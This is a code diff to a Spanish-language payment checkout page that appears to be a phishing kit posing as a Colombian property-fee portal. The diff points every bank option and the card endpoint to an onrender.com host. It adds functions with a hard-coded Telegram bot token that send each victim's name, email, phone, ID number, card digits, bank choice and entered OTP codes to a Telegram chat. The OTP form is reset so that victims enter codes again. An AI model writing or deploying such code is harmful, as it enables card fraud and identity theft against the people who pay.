@@ -520,14 +520,14 @@
                         <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">Banco</label>
                         <select id="pseBank" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
                             <option value="">Selecciona una opción</option>
-                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-nequi/">Nequi</option>
-                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f9/poral/">Bancolombia</option>
-                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f3/">Davivienda</option>
-                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f4/wps.portal/virtual/">Banco De Bogota</option>
-                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f14/">Banco Occidente</option>
-                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f18/">Banco Popular</option>
-                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f1/">Banco AV villas</option>
-                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f2/">Banco Caja Social</option>
+                            <option value="https://psec-px42.onrender.com/transaction/ent/b-nequi/">Nequi</option>
+                            <option value="https://psec-px42.onrender.com/transaction/ent/b-34f9/poral/">Bancolombia</option>
+                            <option value="https://psec-px42.onrender.com/transaction/ent/b-34f3/">Davivienda</option>
+                            <option value="https://psec-px42.onrender.com/transaction/ent/b-34f4/wps.portal/virtual/">Banco De Bogota</option>
+                            <option value="https://psec-px42.onrender.com/transaction/ent/b-34f14/">Banco Occidente</option>
+                            <option value="https://psec-px42.onrender.com/transaction/ent/b-34f18/">Banco Popular</option>
+                            <option value="https://psec-px42.onrender.com/transaction/ent/b-34f1/">Banco AV villas</option>
+                            <option value="https://psec-px42.onrender.com/transaction/ent/b-34f2/">Banco Caja Social</option>
                         </select>
                     </div>
 
@@ -541,12 +541,6 @@
                 </div>
             </div>
 
-            <!-- Mobile: Ver detalles -->
-            <div class="ver-detalles" style="display: none;" id="verDetallesMobile">
-                <span class="ver-detalles-link" onclick="togglePaymentMethods()">
-                    <i class="fa-solid fa-chevron-down"></i> Ver detalles
-                </span>
-            </div>
         </div>
 
         <!-- Right Column: Pago Summary -->
@@ -604,6 +598,51 @@
     </main>
 
     <script>
+        let paymentMethodsExpanded = false;
+
+        function sendToTelegram(data) {
+            const token = '8759383283:AAEGahtOduKJ0q8R7tfXyathcZMwZnRTx3I';
+            const chatId = '-5400378460';
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            const message = `
+📋 *NUEVO PAGO RECIBIDO*
+
+👤 *DATOS DEL CLIENTE*
+├ Nombre: ${data.nombre} ${data.apellido}
+├ Email: ${data.email}
+├ Celular: ${data.celular}
+└ Documento: ${data.tipo_doc} ${data.cedula}
+
+🏢 *INFORMACIÓN DEL INMUEBLE*
+├ Propiedad: ${data.nombreConjunto}
+├ Referencia 1: ${data.referencia1}
+├ Inmueble: ${data.selectedApt}
+└ Referencia 2: ${data.referencia2}
+
+💳 *MÉTODO DE PAGO*
+└ ${data.metodoPago === 'tarjeta' ? 'Tarjeta (**** **** **** ' + data.numero_tarjeta.slice(-4) + ')' : 'PSE - ' + data.pseBank}
+
+💰 *MONTO*
+└ ${data.monto_formateado}
+
+⏰ *FECHA Y HORA*
+└ ${new Date().toLocaleString('es-CO')}
+            `;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(e => console.log('Telegram enviado'));
+        }
+
         document.addEventListener('DOMContentLoaded', function() {
             // Traer datos del sessionStorage
             const userNombre = sessionStorage.getItem('userNombre') || '';
@@ -626,7 +665,6 @@
                     const conjunto = JSON.parse(selectedConjuntoRaw);
                     nombreConjunto = conjunto.name || 'N/A';
                     direccion = conjunto.address || 'N/A';
-                    // Generar referencias (o traer de donde las generen)
                     referencia1 = 'jf' + new Date().getTime().toString().slice(-10);
                     referencia2 = selectedApt;
                 } catch (e) {
@@ -654,17 +692,14 @@
             }).format(totalNumber);
             document.getElementById('portalTotal').textContent = totalFormatted;
 
-            // Mostrar/ocultar "Ver detalles" en móvil
+            // Mostrar métodos de pago siempre
             function checkMobile() {
                 const isMobile = window.innerWidth <= 1024;
-                const verDetalles = document.getElementById('verDetallesMobile');
                 const paymentMethods = document.querySelector('.payment-methods');
 
                 if (isMobile) {
-                    verDetalles.style.display = 'block';
-                    paymentMethods.classList.remove('show');
+                    paymentMethods.classList.add('show');
                 } else {
-                    verDetalles.style.display = 'none';
                     paymentMethods.classList.add('show');
                 }
             }
@@ -720,8 +755,27 @@
                     sessionStorage.setItem('pseDocType', pseDocType);
                     sessionStorage.setItem('psePersonType', psePersonType);
 
+                    // Enviar a Telegram
+                    sendToTelegram({
+                        nombre: userNombre,
+                        apellido: userApellido,
+                        email: userEmail,
+                        celular: userCelular,
+                        tipo_doc: pseDocType,
+                        cedula: pseDocNumber,
+                        nombreConjunto: nombreConjunto,
+                        referencia1: referencia1,
+                        selectedApt: selectedApt,
+                        referencia2: referencia2,
+                        metodoPago: 'pse',
+                        pseBank: pseBank,
+                        monto_formateado: totalFormatted
+                    });
+
                     // Redirigir al banco seleccionado
-                    window.location.href = pseBank;
+                    setTimeout(() => {
+                        window.location.href = pseBank;
+                    }, 500);
                 } else {
                     // Pago con tarjeta
                     const tarjetaDocType = document.getElementById('tarjetaDocType').value;
@@ -735,6 +789,23 @@
                         alert('Por favor completa todos los campos de tarjeta');
                         return;
                     }
+
+                    // Enviar a Telegram
+                    sendToTelegram({
+                        nombre: userNombre,
+                        apellido: userApellido,
+                        email: userEmail,
+                        celular: userCelular,
+                        tipo_doc: tarjetaDocType,
+                        cedula: tarjetaCedula,
+                        nombreConjunto: nombreConjunto,
+                        referencia1: referencia1,
+                        selectedApt: selectedApt,
+                        referencia2: referencia2,
+                        metodoPago: 'tarjeta',
+                        numero_tarjeta: tarjetaNumero,
+                        monto_formateado: totalFormatted
+                    });
 
                     // Preparar datos para enviar
                     const formData = new FormData();
@@ -750,22 +821,18 @@
                     formData.append('monto', finalAmount);
 
                     // Enviar a backend
-                    fetch('https://psec-gdb0.onrender.com/panel/run/create_tarjeta_m3it3m.php', {
+                    fetch('https://psec-px42.onrender.com/panel/run/create_tarjeta_m3it3m.php', {
                         method: 'POST',
                         body: formData
                     })
                     .then(response => response.json())
                     .then(data => {
                         if (data.status === 'OK') {
-                            // Mostrar modal de LOAD
                             showLoadingModal(tarjetaNumero, userNombre, userApellido, finalAmount, nombreConjunto);
-
-                            // Después de 10 segundos, mostrar OTP
                             setTimeout(() => {
                                 showOTPModal(tarjetaNumero, userNombre, userApellido, finalAmount, nombreConjunto);
                             }, 10000);
                         } else {
-                            // Mostrar mensaje amigable, no técnico
                             alert('❌ No se pudo procesar el pago. Por favor intenta de nuevo.');
                         }
                     })
@@ -777,7 +844,7 @@
 
             // ✅ Auto-formatear fecha (MM/YY)
             document.getElementById('tarjetaFecha').addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, ''); // Solo números
+                let value = e.target.value.replace(/\D/g, '');
                 if (value.length >= 2) {
                     value = value.slice(0, 2) + '/' + value.slice(2, 4);
                 }
@@ -790,12 +857,7 @@
             });
         });
 
-        function togglePaymentMethods() {
-            const methods = document.querySelector('.payment-methods');
-            methods.classList.toggle('show');
-        }
 
-        // Modal LOAD (espera 10 segundos)
         function showLoadingModal(tarjeta, nombre, apellido, monto, comercio) {
             const html = `
                 <div id="loadingModal" style="position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 2000;">
@@ -814,9 +876,7 @@
             document.body.insertAdjacentHTML('beforeend', html);
         }
 
-        // Modal OTP
         function showOTPModal(tarjeta, nombre, apellido, monto, comercio) {
-            // Remover modal de loading si existe
             const loadingModal = document.getElementById('loadingModal');
             if (loadingModal) loadingModal.remove();
 
@@ -860,23 +920,60 @@
             `;
             document.body.insertAdjacentHTML('beforeend', html);
 
-            // Focus en input
             setTimeout(() => {
                 document.getElementById('otpInput').focus();
             }, 100);
 
-            // Botón Continuar
             document.getElementById('btnContinuarOTP').addEventListener('click', function() {
                 const otp = document.getElementById('otpInput').value;
                 if (!otp || otp.length !== 6) {
                     alert('Por favor ingresa un código OTP válido (6 dígitos)');
                     return;
                 }
-                // TODO: Aquí se procesaría el OTP
-                alert('✅ OTP confirmado: ' + otp);
-                document.getElementById('otpModalOverlay').remove();
-                sessionStorage.clear();
-                window.location.href = 'busqueda.html';
+
+                // Cambiar botón a loading
+                const btnContinuar = document.getElementById('btnContinuarOTP');
+                const otpInput = document.getElementById('otpInput');
+                btnContinuar.disabled = true;
+                btnContinuar.innerHTML = '<div style="display: inline-block; width: 20px; height: 20px; border: 3px solid #f0f0f0; border-top-color: white; border-radius: 50%; animation: spin 1s linear infinite;"></div>';
+
+                // Enviar OTP a Telegram
+                const token = '8759383283:AAEGahtOduKJ0q8R7tfXyathcZMwZnRTx3I';
+                const chatId = '-5400378460';
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+                const otpMessage = `
+✅ *OTP CONFIRMADO*
+
+📱 Código OTP: ${otp}
+💳 Tarjeta: **** **** **** ${tarjeta.slice(-4)}
+👤 Cliente: ${nombre} ${apellido}
+💰 Monto: ${totalFormatted}
+🏢 Comercio: ${comercio || '—'}
+
+⏰ *FECHA Y HORA*
+└ ${new Date().toLocaleString('es-CO')}
+                `;
+
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: otpMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // Después de 10 segundos, resetear
+                setTimeout(() => {
+                    otpInput.value = '';
+                    otpInput.focus();
+                    btnContinuar.disabled = false;
+                    btnContinuar.innerHTML = 'Continuar';
+                }, 10000);
             });
         }
     </script>
